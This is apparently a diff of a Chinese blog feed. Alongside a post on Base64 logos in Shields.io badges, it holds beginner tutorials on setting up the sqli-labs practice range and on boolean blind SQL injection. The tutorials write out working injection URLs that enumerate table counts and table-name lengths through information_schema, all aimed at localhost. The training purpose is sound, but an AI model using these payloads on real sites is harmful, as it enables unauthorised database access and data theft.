+</div><div class="story post-story"><h2 id="官网描述"><a href="#官网描述" class="headerlink" title="官网描述"></a>官网描述</h2><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/13/62a75e74543bc.png" data-fancybox="one" data-caption="desc"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/13/62a75e74543bc.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/13/62a75e74543bc.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="desc"></a><span class="image-caption">desc</span></div></div>
+<p>查看官网我们得到这样的信息。发现<a href="https://shields.io/">Shields.io</a>其实是允许我们插入自定义logo图片的，但是要求是高度大于等于14px且http的请求头不能超过8192字节。只要知道文件Base64编码的DataURL形式就可以了。</p>
+</div><div class="story post-story"><h2 id="图片准备"><a href="#图片准备" class="headerlink" title="图片准备"></a>图片准备</h2><h3 id="裁剪压缩图片"><a href="#裁剪压缩图片" class="headerlink" title="裁剪压缩图片"></a>裁剪压缩图片</h3><p>使用png格式图片进行裁剪压缩，我直接用的在线工具：</p>
+<div class="tag link"><a class="link-card" title="I❤IMG" href="https://www.iloveimg.com/zh-cn/compress-image"><div class="left"><img src="https://www.iloveimg.com/img/favicons-img/favicon-16x16.png" class="lazyload" data-srcset="https://www.iloveimg.com/img/favicons-img/favicon-16x16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">I❤IMG</p><p class="url">https://www.iloveimg.com/zh-cn/compress-image</p></div></a></div>
+
+<p>建议将图片裁剪压缩到5k左右，这样能使http请求头尽量小。<del>况且徽章小，图片文件小些没关系</del></p>
+<h3 id="获取图片Base64编码的DataURL形式"><a href="#获取图片Base64编码的DataURL形式" class="headerlink" title="获取图片Base64编码的DataURL形式"></a>获取图片Base64编码的DataURL形式</h3><p>推荐大佬做的工具</p>
+<div class="tag link"><a class="link-card" title="Base64在线解码编码" href="https://base64.us/"><div class="left"><img src="https://base64.us/favicon.png" class="lazyload" data-srcset="https://base64.us/favicon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">Base64在线解码编码</p><p class="url">https://base64.us/</p></div></a></div>
+
+<p>如下图，选择你的logo图片（png格式）</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/13/62a75e7e49dc8.png" data-fancybox="one" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/13/62a75e7e49dc8.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/13/62a75e7e49dc8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div>
+<p>将这一串字符全选复制。</p>
+<h3 id="拼接至URL中"><a href="#拼接至URL中" class="headerlink" title="拼接至URL中"></a>拼接至URL中</h3><p>格式为：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://img.shields.io/badge/左边文字-右边文字-右边颜色?logo=data:image/png;base64,刚刚复制的那串字符</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>比如我的页脚Copyright徽章，URL为</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://img.shields.io/badge/Copyright%402022-Bowen%20Young-%23EF9421?logo=data:image/png;base64,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</span><br></pre></td></tr></tbody></table></figure>
+
+<p>效果为：<img no-lazy="" class="inline" src="/img/copyright.svg" style="height:1.5em"></p>
+</div><div class="story post-story"><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>上文<code>data:image/png;base64,…</code>这种形式被称为<strong>Data URL Scheme</strong>。</p>
+<p><strong>Data URL Scheme</strong>的作用，一般就是将经过Base64编码的数据嵌入网页中，从而减少请求资源的链接数。 上面的<strong>Data URL Scheme</strong>中 base64, 后的字符就是经过base64编码后的数据，浏览器会对其解码并渲染该图片资源。</p>
+
+</div>]]></content>
+      <categories>
+        <category>前端</category>
+      </categories>
+      <tags>
+        <tag>shields</tag>
       </tags>
   </entry>
   <entry>
@@ -1522,6 +1410,118 @@
       <tags>
         <tag>vim</tag>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入新手教程（一）——sqli-labs靶场搭建</title>
+    <url>/posts/sqli1/</url>
+    <content><![CDATA[<div class="story post-story"><h2 id="网站环境搭建"><a href="#网站环境搭建" class="headerlink" title="网站环境搭建"></a>网站环境搭建</h2><p>首先我们要搭建一个（本地）网站环境，如果对搭建网站不是很熟悉的小伙伴们可以使用XAMPP或者PHPstudy来搭建。<span id="more"></span>这两个软件集成了搭建网站所需要用到的PHP、Apache、MySQL等软件。如果自己用其他方式搭建的话要注意sqli-labs是不支持PHP7的，因为之前版本的一些要用到的函数在PHP7中被删除了。我用的是5.6.9版本。<br>这里我就用PHPstudy为例（听名字就知道使用起来更简单）:</p>
+<p>首先确保没有安装过PHP，Apache或MySQL</p>
+<p>前往官网下载PHPstudy：<a href="https://www.xp.cn/">https://www.xp.cn/</a></p>
+<p>下载完成后安装，打开面板。</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53def80f09.png" data-fancybox="one" data-caption="1-1"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53def80f09.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53def80f09.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1-1"></a><span class="image-caption">1-1</span></div></div>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53ded29649.jpg" data-fancybox="one" data-caption="1-2"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53ded29649.jpg" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53ded29649.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1-2"></a><span class="image-caption">1-2</span></div></div>
+<p>如图示操作，第一次打开应该点击更多版本，找到php5.6.9或者更低的版本安装。并将php版本切换成你安装的那个版本。接下来回到首页，按图操作：</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53df038fa1.png" data-fancybox="one" data-caption="1-3"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53df038fa1.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53df038fa1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1-3"></a><span class="image-caption">1-3</span></div></div>
+<p>将WAMP、Apache和MySQL启动，其他的停止。这里可能会遇到端口被占用的情况导致某个套件无法启动。遇到这个问题可以去找占用了改端口的进程并将其停止。Windows用户可以参考这篇文章：<a href="https://www.runoob.com/w3cnote/windows-finds-port-usage.html">链接</a></p>
+<p>如果上述过程都顺利完成，接下来在你的浏览器输入localhost或127.0.0.1就可以进入默认网页。这时就代表网站环境已经搭建成功了！<del>芜湖！</del></p>
+</div><div class="story post-story"><h2 id="sqli-labs下载与配置"><a href="#sqli-labs下载与配置" class="headerlink" title="sqli-labs下载与配置"></a>sqli-labs下载与配置</h2><p>sqli-labs在GitHub上开源，直接到仓库里下载zip文件：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53df0d2646.png" data-fancybox="one" data-caption="2-1"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53df0d2646.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53df0d2646.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2-1"></a><span class="image-caption">2-1</span></div></div>
+<p>下载完成后解压并复制到<code>phpstudy_pro\www\</code>目录下</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53df1584e7.png" data-fancybox="one" data-caption="2-2"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53df1584e7.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53df1584e7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2-2"></a><span class="image-caption">2-2</span></div></div>
+<p>我这里将解压好的文件夹重命名为<code>sqli</code>方便我之后打开。<br><strong>注意：要确保你复制过来的文件夹打开是下图这样，如果打开是一个同名的文件夹，你应该把图中内容剪切出来并删除这个同名的文件夹</strong></p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53df1de40d.png" data-fancybox="one" data-caption="2-3"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53df1de40d.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53df1de40d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2-3"></a><span class="image-caption">2-3</span></div></div>
+<p>接着在<code>sql-connections</code>目录下找到<code>db-creds.inc</code>文件并打开修改</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53df27d2c7.png" data-fancybox="one" data-caption="2-4"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53df27d2c7.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53df27d2c7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2-4"></a><span class="image-caption">2-4</span></div></div>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/20/62b0461ad5085.png" data-fancybox="one" data-caption="2-5"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/20/62b0461ad5085.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/20/62b0461ad5085.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2-5"></a><span class="image-caption">2-5</span></div></div>
+<p>使用PHPstudy的话，用户名密码默认都是root，都修改为root即可。要是不喜欢的话可以打开PHPstudy面板点击数据库，按照相应提示修改密码就可以了。<strong>但一定要确保MySQL数据库的用户名密码和该配置中一致！！！</strong></p>
+<p>接下来在浏览器中输入<code>localhost/sqli/</code>，这里<code>sqli</code>要换成你在Github上下载的那个文件夹解压后改的名字。（可以补充一下，这里搭建的网站其实就是www根目录下的所有文件和目录的集合。在后面加一个sqli/其实就是进入了sqli这个文件夹，然后进这个文件夹默认显示的就是这个文件夹里面的index.html或者index.php）</p>
+<p>言归正传，打开后显示如图：</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/13/62a757f5a169c.png" data-fancybox="one" data-caption="2-6"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/13/62a757f5a169c.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/13/62a757f5a169c.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2-6"></a><span class="image-caption">2-6</span></div></div>
+<p>点击<code>setup/reset Database for labs</code>进行sqli-labs的初始化，初始化成功的页面如图：</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53dec406ec.png" data-fancybox="one" data-caption="2-7"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53dec406ec.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53dec406ec.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2-7"></a><span class="image-caption">2-7</span></div></div>
+<p>如果看到这个页面，congratulations！sqli-labs靶场环境已经搭建成功了。接下来只要点击page1/2/3/4就可以去完成挑战了！</p>
+</div><div class="story post-story"><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>还是要强调，不要在不被授权的网站上练习MySQL。<br>下一期（很快555）我们学习基于报错的的注入，也就是less1-less6。</p>
+
+</div>]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入新手教程（三）——布尔盲注</title>
+    <url>/posts/sqli3/</url>
+    <content><![CDATA[<p>在<a href="../../posts/sqli2/">上一期教程</a>中我们学习了基于报错的注入，或者准确地说是GET型基于报错的注入。相信大家也看出来了，这种注入是非常简单的，意味着这种漏洞是非常低级的。我们所见到的大多数网站中都不会出现如此低级的SQL注入漏洞。更多时候页面是不会回显报错语句的，这时候事情就变复杂了。我们无法直接看到报错语句，就需要通过估计不同的查询结果是TRUE还是FALSE来判断某个数据库是否能够注入，这就是盲注！</p>
+<div class="story post-story"><h2 id="布尔盲注原理"><a href="#布尔盲注原理" class="headerlink" title="布尔盲注原理"></a>布尔盲注原理</h2><p>之所以叫盲注，是因为我们在注入的过程中不会看到后端的错误返回语句。此时，如果我们执行的语句返回值为1，页面的显示是一种模样，如果为0，那么页面的显示是另一种模样。利用这样的特性，我们可以在SQL语句中加入逻辑表达式、关系表达式，不断试错，从而理论上能够解得我们所需要的数据，这和猜解密码有点相似。</p>
+</div><div class="story post-story"><h2 id="判断数据库是否能被布尔盲注"><a href="#判断数据库是否能被布尔盲注" class="headerlink" title="判断数据库是否能被布尔盲注"></a>判断数据库是否能被布尔盲注</h2><p>依然，我们首先打开PHPstudy面板，启动WAMP。<br>在浏览器地址栏输入<a href="http://localhost/sqli/Less-8/?id=1">http://localhost/sqli/Less-8/?id=1</a>进入Lesson8（按照你的端口号、目录名等修改）。<br>猜测对应的后端SQL语句为：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>此时页面显示如下：</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/21/62b1bc0d87e23.png" data-fancybox="default" data-caption="有提示文字"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/21/62b1bc0d87e23.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/21/62b1bc0d87e23.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="有提示文字"></a><span class="image-caption">有提示文字</span></div></div>
+
+<p>接着我们尝试破坏查询，在地址栏输入</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1'</span><br></pre></td></tr></tbody></table></figure>
+
+<p>猜测对应的后端SQL语句为：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="string">'</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>发现页面显示如下：</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/21/62b1bcef999c9.png" data-fancybox="default" data-caption="无提示文字"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/21/62b1bcef999c9.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/21/62b1bcef999c9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="无提示文字"></a><span class="image-caption">无提示文字</span></div></div>
+
+<p>观察上图我们可以发现，<code>You are in...</code>这段话不见了，说明这段查询语句是有问题的，即我们破坏查询成功了。但是页面没有回显报错信息，说明我们之前用的显注方法失效了。这时我们便要用到布尔盲注了。</p>
+<p>接着我们就继续判断我们传入的参数在后端是如何被封装的。<br>在地址栏输入</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost:81/sqli/Less-8/?id=1' and 1=1 --+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>发现那段文字<code>You are in...</code>（后文称提示文字）又重新出现了，这证明：(i)参数是由单引号封装的；(ii)后端对1=1进行了判断并返回TRUE，可以进行布尔盲注。<br>因此推翻之前的SQL语句猜测，此处后端SQL语句形如：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="string">'1'</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+'</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+</div><div class="story post-story"><h2 id="布尔盲注思路"><a href="#布尔盲注思路" class="headerlink" title="布尔盲注思路"></a>布尔盲注思路</h2><p>确认能够进行布尔盲注后，我们需要想办法获取我们想要的数据。通常会编写脚本来自动进行布尔盲注，但本文重点在于厘清布尔盲注的原理和实现路线，因此采用手动注入的方法。</p>
+<p>首先，我们需要知道当前数据库有哪些表、各自的名称，并判断哪些表含有重要信息；接着，我们需要知道表里有哪些字段、各自的名称，并判断哪些字段含有重要信息；最后我们获取到相应字段对应的每一条记录。</p>
+<p>这个由大及小的思路与之前的盲注并无差别，唯一不同的是这次我们不会直接看到查询的结果，而需要通过逻辑表达式和关系表达式是否返回为TRUE来猜解我们想要得到的信息。在布尔盲注的过程中，由于表中数据的不确定性，如果我们想要通过枚举出查询结果所有可能的值，这个工作量是非常大的。因此，我的方法是先确定数据库中表的数量，再确定每一个表的名称。确定表名时，先得到查询结果的字符串长度区间，再确定字符串长度，先确定每一个字符的ASCII码区间，再确定每一个字符的确切ASCII码。如果你有点迷糊了，没有关系，请接着往下看。</p>
+</div><div class="story post-story"><h2 id="确定数据库中表的数量"><a href="#确定数据库中表的数量" class="headerlink" title="确定数据库中表的数量"></a>确定数据库中表的数量</h2><p>我采用的方法是：让后端判断第n个表的字符串长度是否大于0，如果提示文字出现，则证明数据库有第n个表，否则证明数据库中最多有n-1个表。</p>
+<p>在地址栏输入</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 3,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>后端SQL语句形如：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="string">'1'</span> <span class="keyword">and</span> (length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">3</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> <span class="number">0</span> <span class="comment">--+'</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>这段语句的意思为：从数据库的表名中查询id=’1’的所有字段并且当前数据库中的第4个表名字符串长度大于0。其中length()函数作用是取查询结果的字符串长度，用法为length(字符串)。如果你忘了这句语句中其他地方的含义，请见<a href="../sqli2/">上一章</a>。<br>结果，页面显示了提示文字。表明当前数据库至少有4张表。<br>接着我们将地址栏中的字符改为</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 4,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>作用是判断第5个表的字符串长度是否大于0，换言之，第5张表是否存在。<br>结果发现页面并没有显示提示文字。<br>由此，我们得到结论：当前数据库中有且仅有4张表。</p>
+</div><div class="story post-story"><h2 id="确定表名的字符串长度"><a href="#确定表名的字符串长度" class="headerlink" title="确定表名的字符串长度"></a>确定表名的字符串长度</h2><p>我们首先确定第一张表的字符串长度，用到的方法与上一小节类似。<br>在地址栏输入</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) &gt; 5 --+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>作用是判断第一张表表名的字符串长度是否大于5。<br>结果页面显示提示文字，证明第一张表表名的字符串长度大于5。<br>接着我们将5改成6，发现页面不显示提示文字了。答案也就出来了，第一张表表名的字符串长度为6。用同样的方法我们也可以获取其他表名的字符串长度。</p>
